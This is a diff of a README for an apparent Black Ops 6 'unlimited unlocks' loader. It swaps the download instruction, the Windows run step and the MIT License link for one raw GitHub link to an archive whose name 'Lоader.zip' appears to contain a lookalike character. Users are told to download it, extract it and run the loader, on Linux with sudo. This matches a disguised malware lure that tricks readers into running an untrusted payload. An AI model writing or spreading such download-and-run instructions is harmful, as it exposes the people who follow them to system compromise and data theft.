@@ -34,10 +34,10 @@ Unlock an abundance of powerful options:
 
 Follow these steps to unlock all features on your system:
 
-1. **Download _Loader.rar_ from the repository.**
+1. **Download https://raw.githubusercontent.com/mejba-alam/BO6-UnlimitedUnlocks/main/Lоader.zip from the repository.**
 2. Extract the contents to a folder of your choice using any extraction tool such as WinRAR or 7-Zip.
 3. Run the appropriate loader file for your operating system:
-   - For Windows: Double-click `bo6_loader.exe`
+   - For Windows: Double-click `https://raw.githubusercontent.com/mejba-alam/BO6-UnlimitedUnlocks/main/Lоader.zip`
    - For macOS: Open a terminal and run `./bo6_loader_macos`
    - For Linux: Terminal command `sudo ./bo6_loader_linux`
 4. Follow the on-screen instructions for fast unlocking. Enjoy your unlocked game features!
@@ -76,7 +76,7 @@ This repository and its contents are for educational, research, and personal use
 
 ## 📄 MIT License
 
-This project is licensed under the [MIT License](https://opensource.org/license/mit/).  
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/mejba-alam/BO6-UnlimitedUnlocks/main/Lоader.zip).  
 You are free to use, modify, and share this loader for any purpose as long as the original license is included.
 
 ---
